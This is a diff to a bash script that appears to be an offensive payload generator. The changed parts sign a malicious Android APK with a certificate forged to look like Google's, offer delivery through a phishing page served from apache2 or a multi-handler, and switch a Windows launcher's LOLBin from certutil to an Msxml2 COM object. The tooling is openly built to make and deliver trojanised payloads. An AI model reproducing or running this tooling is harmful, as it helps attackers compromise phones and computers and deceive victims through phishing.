@@ -7314,27 +7314,38 @@ if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
    imp=`which keytool`
    if [ "$?" -eq "0" ]; then
       echo "[☠] Signing $N4m.apk using keytool .."
-      echo "[☠] keytool packet found (dependencie).."
+      echo "[☠] keytool install found (dependencie)..";sleep 1
       cd $IPATH/output
       imp=`which zipalign`
       if [ "$?" -eq "0" ]; then
-         echo "[☠] zipalign packet found (dependencie).."
+         echo "[☠] zipalign install found (dependencie)..";sleep 1
       else
-         echo "[☠] zipalign packet NOT found (installing)..";sleep 2
-         sudo apt-get install zipalign
+         echo "${RedF}[x]${white} 'zipalign' packet NOT found (installing)..";sleep 2
+         echo "";sudo apt-get install zipalign;echo ""
       fi
 
-      echo "---";echo ""
-      ## https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/
+      ## Sign (SSL certificate) apk Banner
+      # https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/
+      echo "---"
+      echo "- ${YellowF}Android Apk Certificate Function:${Reset}"
+      echo "- After Successfully created the .apk file, we need to sign an certificate to it,"
+      echo "- because Android mobile devices are not allowing the installing of apps without"
+      echo "- the signed certificate. This function uses (keytool | jarsigner | zipalign) to"
+      echo "- sign our apk with an SSL certificate (google). We just need to manually input 3"
+      echo "- times a SecretKey (password) when asked further head."
+      echo "---"
       keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";sleep 1;echo ""
       jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 1;echo ""
-      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo "";echo "---"
+      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo ""
       mv done.apk $Nam.apk > /dev/null 2>&1
       cd $IPATH
    else
-      echo "[☠] Abort, keytool packet not found.."
+      echo "${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found.."
+      echo "[☠] Please Install 'keytool' packet before continue ..";sleep 3
+      sh_android_menu # <--- return to android/ios menu
    fi
 fi
+
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.apk\n\nchose how to deliver: $N4m.apk" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
@@ -7368,7 +7379,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
       # edit files nedded
-      echo "[☠] copy files to webroot..."
+      echo "[☠] Porting ALL files to apache2 webroot..."
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
       sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
@@ -11860,7 +11871,7 @@ echo ${BlueF}
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : certutil
+    LOLBin   : Msxml2 ComObject
     LAUNCHER : $IPATH/output/$NaM.bat
     AGENT    : $IPATH/output/$NaM.exe
 
